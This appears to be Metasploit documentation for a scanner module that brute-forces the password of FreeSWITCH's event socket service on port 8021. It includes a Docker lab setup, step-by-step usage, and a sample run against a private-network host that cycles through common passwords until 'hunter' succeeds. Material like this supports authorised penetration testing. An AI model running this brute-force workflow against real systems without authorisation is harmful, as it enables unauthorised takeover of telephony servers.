## Vulnerable Application
[FreeSWITCH](https://freeswitch.com/) is a free and open-source software defined telecommunications stack for real-time communication,
WebRTC, telecommunications, video, and Voice over Internet Protocol.

The [Event Socket](https://freeswitch.org/confluence/display/FREESWITCH/mod_event_socket) `mod_event_socket` is a TCP based interface to
control FreeSWITCH and is enabled by default.

This module has been tested successfully on FreeSWITCH versions:
* 1.10.7-release-19-883d2cb662~64bit on Debian 10.11 (buster)

### Description

This module is a login utility to find the password of the FreeSWITCH event socket service by bruteforcing the login interface.
Note that this service does not require a username to log in; login is done purely via supplying a valid password.
This module will stops as soon as a valid password is found.

This service is enabled by default and listens on TCP port 8021 on the local network interface.

Source and Installers:
* [Source Code Repository](https://github.com/signalwire/freeswitch)
* [Installers](https://freeswitch.org/confluence/display/FREESWITCH/Installation)
* [Virtual Machine](https://freeswitch.com/index.php/fs-virtual-machine/)
* [Docker](https://github.com/drachtio/docker-drachtio-freeswitch-mrf)

Docker installation:
```
docker pull drachtio/drachtio-freeswitch-mrf
docker run -d --rm --name FS1 --net=host \
-v /home/deploy/log:/usr/local/freeswitch/log  \
-v /home/deploy/sounds:/usr/local/freeswitch/sounds \
-v /home/deploy/recordings:/usr/local/freeswitch/recordings \
drachtio/drachtio-freeswitch-mrf freeswitch --sip-port 5038 --tls-port 5039 --rtp-range-start 20000 --rtp-range-end 21000 --password hunter
```

## Verification Steps
1. Do: `use auxiliary/scanner/misc/freeswitch_event_socket_login`
2. Do: `set RHOSTS [ips]`
3. Do: `set PASS_FILE /home/kali/passwords.txt`
4. Do: `run`

## Options
### PASS_FILE
The file containing a list of passwords to try logging in with.

## Scenarios
### FreeSWITCH 1.10.7 Linux Debian 10.11 (Docker Image)
```
msf6 > use auxiliary/scanner/misc/freeswitch_event_socket_login
msf6 auxiliary(scanner/misc/freeswitch_event_socket_login) > set RHOSTS 192.168.56.1
RHOSTS => 192.168.56.1
msf6 auxiliary(scanner/misc/freeswitch_event_socket_login) > set PASS_FILE /home/kali/passwords.txt
PASS_FILE => /home/kali/passwords.txt
msf6 auxiliary(scanner/misc/freeswitch_event_socket_login) > run

[!] 192.168.56.1:8021        - No active DB -- Credential data will not be saved!
[-] 192.168.56.1:8021        - 192.168.56.1:8021 - LOGIN FAILED: ClueCon (Incorrect: -ERR invalid)
[-] 192.168.56.1:8021        - 192.168.56.1:8021 - LOGIN FAILED: admin (Incorrect: -ERR invalid)
[-] 192.168.56.1:8021        - 192.168.56.1:8021 - LOGIN FAILED: 123456 (Incorrect: -ERR invalid)
[-] 192.168.56.1:8021        - 192.168.56.1:8021 - LOGIN FAILED: 12345 (Incorrect: -ERR invalid)
[-] 192.168.56.1:8021        - 192.168.56.1:8021 - LOGIN FAILED: 123456789 (Incorrect: -ERR invalid)
[-] 192.168.56.1:8021        - 192.168.56.1:8021 - LOGIN FAILED: password (Incorrect: -ERR invalid)
[+] 192.168.56.1:8021        - 192.168.56.1:8021 - Login Successful: hunter (Successful: +OK accepted)
[*] 192.168.56.1:8021        - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```
